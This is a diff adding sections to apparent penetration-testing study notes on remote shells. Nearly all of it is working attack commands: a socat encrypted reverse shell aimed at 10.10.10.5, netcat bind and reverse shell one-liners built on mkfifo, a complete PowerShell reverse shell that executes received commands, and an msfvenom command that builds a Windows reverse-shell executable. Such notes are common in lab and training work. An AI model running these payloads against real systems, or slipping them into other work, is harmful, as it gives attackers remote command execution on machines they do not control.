@@ -78,4 +78,14 @@ Steps to use the feature:
 
 6. what if we want to use the tty technique with the encrypted shell? here is the command to use: `socat OPENSSL-LISTEN:53 FILE:`tty`,raw,echo=0,cert=shell.pem,verify=0 -`, and to connect back, we use `socat OPENSSL:10.10.10.5:53 EXEC:"bash -li",pty,stderr,sigint,setsid,sane`.
 
+# Common Shell Payloads
+As normal we can start the listener with `nc -lvnp <PORT> -e /bin/bash` and connect with `nc <LOCAL-IP> <PORT> -e /bin/bash`, however on linux we need to use the following: `mkfifo /tmp/f; nc -lvnp <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f` and to connect: `mkfifo /tmp/f; nc <LOCAL-IP> <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f`.
+
+One-liner PSH reverse shell, usually when tageting a windows server:
+```powershell -c "$client = New-Object System.Net.Sockets.TCPClient('<ip>',<port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"```
+
+
+# msfvenom
+The standard syntax for msfvenom is as follows: `msfvenom -p <PAYLOAD> <OPTIONS>`. For example, to generate a Windows x64 Reverse Shell in an exe format, we could use: `msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=<listen-IP> LPORT=<listen-port>`.
+
 
